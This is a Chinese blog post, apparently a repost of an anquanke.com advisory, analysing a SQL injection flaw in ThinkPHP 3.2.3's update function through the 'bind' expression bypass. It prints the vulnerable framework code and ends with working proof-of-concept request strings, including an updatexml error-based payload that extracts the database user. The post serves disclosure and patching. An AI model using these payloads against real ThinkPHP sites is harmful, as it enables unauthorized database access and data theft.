title: Thinkphp3.2.3发现SQL注入漏洞！
author: hojun
avatar: /images/favicon.png
authorDesc: 一个好奇的人
categories: 技术
date: 2018-04-16 19:40:40
authorLink:
authorAbout:
tags:
 - thinkphp
 - php
keywords: SQL注入漏洞
description: 安全客文章报道发现Thinkphp3.2.3最新版SQL注入漏洞！还使用Thinkphp3.2.3版本的小伙伴赶紧去github上更新补丁
photos:
 - https://wx2.sinaimg.cn/large/006bYVyvgy1fqeqiwzno1j30au0643yf.jpg
---
![](https://wx2.sinaimg.cn/large/006bYVyvgy1fqeqiwzno1j30au0643yf.jpg)
安全客文章报道发现Thinkphp3.2.3最新版SQL注入漏洞！还使用Thinkphp3.2.3版本的小伙伴赶紧去github上更新补丁！

----------


## **漏洞详情**
由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入。

thinkphp系列框架过滤表达式注入多半采用I函数去调用think_filter
```php
function think_filter(&$value){
    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))
```
有没有相关tips来达到I函数绕过呢？是可以的。
一般按照官方的写法，thinkphp提供了数据库链式操作，其中包含连贯操作和curd操作，在进行数据库CURD操作去更新数据的时候：
举例update数据操作。
![](https://wx1.sinaimg.cn/large/006bYVyvgy1fqeqbe8b70j30jm0c4mz4.jpg)
直接看框架的where子单元函数，之前网上公开的exp表达式注入就是从这里分析出来的结论:
Thinkphp/Library/Think/Db/Driver.class.php
其中除了exp能利用外还有一处bind，而bind可以完美避开了think_filter：

```php
elseif('bind' == $exp ){ // 使用表达式
    $whereStr .= $key.' = :'.$val[1];
}elseif('exp' == $exp ){ // 使用表达式
    $whereStr .= $key.' '.$val[1];
```

这里由于拼接了`$val`参数的形式造成了注入，但是这里的bind表达式会引入:符号参数绑定的形式去拼接数据，通过白盒对几处CURD操作函数进行分析定位到update函数，insert函数会造成sql注入，于是回到上面的updateh函数。
Thinkphp/Library/Think/Db/Driver.class.php
接着跟进execute函数，这里有处对$this->queryStr进行字符替换的操作：

```php
$this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '''.$that->escapeString($val).'''; },$this->bind));
```

具体是什么，我这里写了一个实例：
常规的跟新数据库用户信息的操作：
Application/Home/Controller/UserController.class.php
```php
<?php
namespace HomeController;
use ThinkController;
class UserController extends Controller {
    public function index(){
        $User = M("member");
        $user['id'] = I('id');
        $data['money'] = I('money');
        $data['user'] = I('user');
        $valu = $User->where($user)->save($data);
        var_dump($valu);
    }
}
```
根据进来的id更新用户的名字和钱，构造一个简单一个poc
id[]=bind&id[]=1’&money[]=1123&user=liao
当走到execute函数时sql语句为：
```sql
UPDATE `member` SET `user`=:0 WHERE `id` = :1'
```
然后`$that = $this`
![](https://wx3.sinaimg.cn/large/006bYVyvgy1fqeqb93u9aj30f203cmxk.jpg)
然后下面的替换操作是将”:0”替换为外部传进来的字符串，这里就可控了。
![](https://wx3.sinaimg.cn/large/006bYVyvgy1fqeqb43ayyj30hs016mx5.jpg)
替换后：
![](https://wx3.sinaimg.cn/large/006bYVyvgy1fqeqbjj36jj30ea03bwew.jpg)
明显发现之前的user参数为:0然后被替换为了liao，这样就把:替换掉了。
后面的:1明显是替换不掉的：
![](https://wx1.sinaimg.cn/large/006bYVyvgy1fqeqims50kj30xk07nmyj.jpg)
那么我们将id[1]数组的参数变为0呢？
id[]=bind&id[]=0%27&money[]=1123&user=liao
![](https://wx1.sinaimg.cn/large/006bYVyvgy1fqeqirsj4qj312y08bwgd.jpg)
果然造成了注入：
POC:
money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
![](https://wx1.sinaimg.cn/large/006bYVyvgy1fqeqj21mpsj311h06kq4e.jpg)

----------


## **修复方式**
更新最新补丁
https://github.com/top-think/thinkphp/
[原文地址](https://www.anquanke.com/post/id/104847)www.anquanke.com/post/id/104847